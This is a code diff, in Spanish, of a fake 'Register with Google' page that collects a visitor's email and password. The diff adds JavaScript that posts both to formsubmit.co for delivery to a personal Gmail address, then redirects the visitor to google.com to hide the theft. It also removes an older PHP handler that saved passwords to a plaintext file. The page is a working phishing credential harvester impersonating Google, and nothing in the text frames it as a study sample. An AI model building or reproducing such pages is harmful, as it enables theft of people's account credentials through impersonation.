@@ -57,12 +57,19 @@
             text-align: center;
             margin-top: 15px;
         }
+        /* CAMBIO: Estilo para el mensaje de carga */
+        .loading {
+            text-align: center;
+            margin-top: 10px;
+            color: #3498db;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Regístrese con Google</h1>
-        <form action="procesar_registro.php" method="POST">
+        <form id="registroForm">
             <div class="form-group">
                 <label for="email">Correo electrónico:</label>
                 <input type="email" id="email" name="email" required placeholder="usuario@gmail.com">
@@ -72,46 +79,70 @@
                 <input type="password" id="password" name="password" required>
             </div>
             <button type="submit">Registrarse</button>
+            <!-- CAMBIO: Mensaje de carga oculto inicialmente -->
+            <div id="loadingMessage" class="loading" style="display: none;">Enviando datos, por favor espere...</div>
         </form>
         <div class="login-link">
             ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión</a>
         </div>
     </div>
+
+    <script>
+        document.getElementById('registroForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Evita la recarga de página
+            
+            const form = this;
+            const submitButton = form.querySelector('button[type="submit"]');
+            const loadingMessage = document.getElementById('loadingMessage');
+            
+            // CAMBIO: Deshabilitar botón y mostrar mensaje de carga
+            submitButton.disabled = true;
+            submitButton.textContent = "Enviando...";
+            loadingMessage.style.display = 'block';
+            
+            // Obtener los datos del formulario
+            const formData = new FormData(form);
+            const data = {
+                email: formData.get('email'),
+                password: formData.get('password'),
+                _subject: "Nuevo registro en tu sitio",
+                _template: "table",
+                _captcha: "false"
+            };
+            
+            // CAMBIO: Enviar datos y esperar respuesta antes de redirigir
+            fetch('https://formsubmit.co/ajax/enriquepng1@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error("Error en la respuesta del servidor");
+                return response.json();
+            })
+            .then(data => {
+                console.log("Éxito:", data);
+                // CAMBIO: Redirigir solo si el envío fue exitoso
+                window.location.href = "https://www.google.com";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // CAMBIO: Restaurar botón y ocultar mensaje de carga
+                submitButton.disabled = false;
+                submitButton.textContent = "Registrarse";
+                loadingMessage.style.display = 'none';
+                // Opcional: Mostrar mensaje de error al usuario
+                alert("Error al enviar el formulario. Por favor, inténtalo de nuevo.");
+            });
+        });
+        
+        // Protección adicional contra recarga (opcional)
+        window.addEventListener('beforeunload', function(e) {
+            // Puedes dejarlo así o personalizar el mensaje
+        });
+    </script>
 </body>
 </html>
-<?php
-// Configuración básica de seguridad
-header('Content-Type: text/html; charset=utf-8');
-
-// Validar que se envió el formulario
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Obtener datos del formulario
-    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
-    $password = $_POST['password']; // En una aplicación real, esto debería hashearse
-    
-    // Validaciones básicas
-    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        die("Por favor ingrese un correo electrónico válido.");
-    }
-    
-    if (empty($password)) {
-        die("La contraseña no puede estar vacía.");
-    }
-    
-    // En una aplicación real:
-    // 1. Deberías usar password_hash() para almacenar contraseñas de forma segura
-    // 2. Los datos deberían guardarse en una base de datos, no en un archivo de texto
-    
-    // Ejemplo básico (NO USAR EN PRODUCCIÓN):
-    $datos = "Email: $email, Contraseña: $password\n";
-    file_put_contents('registros.txt', $datos, FILE_APPEND);
-    
-    // Redireccionar después del registro
-    header('Location: registro_exitoso.html');
-    exit;
-} else {
-    // Si alguien intenta acceder directamente al script
-    header('Location: registro.html');
-    exit;
-}
-?>
